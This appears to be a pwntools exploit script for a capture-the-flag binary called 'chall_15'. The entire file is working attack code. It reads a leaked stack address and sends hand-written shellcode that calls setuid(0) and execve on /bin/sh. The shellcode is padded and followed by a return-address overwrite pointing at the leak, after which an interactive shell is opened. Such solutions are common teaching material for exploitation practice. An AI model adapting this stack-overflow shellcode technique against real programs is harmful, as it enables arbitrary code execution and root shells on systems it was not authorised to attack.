from pwn import *

p = process("./chall_15")
p.sendline("hi")

p.recvuntil(b"0x")
leak = int(p.recvuntil(b"\n"), 16)
print(leak)
print(hex(leak))

offset = 78
filler = p32(0xfacade)
context.arch = "amd64"

#payload = asm(shellcraft.sh())
payload = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62" + b"\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31" + b"\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c" + b"\x58\x0f\x05"
# it had a check where
payload += b"A"*(66 - len(payload)) + filler*3 + p64(leak)
#payload += b"A"*(66 - len(payload)) + filler + b"B"*8 + p64(leak)

p.sendline(payload)
p.interactive()
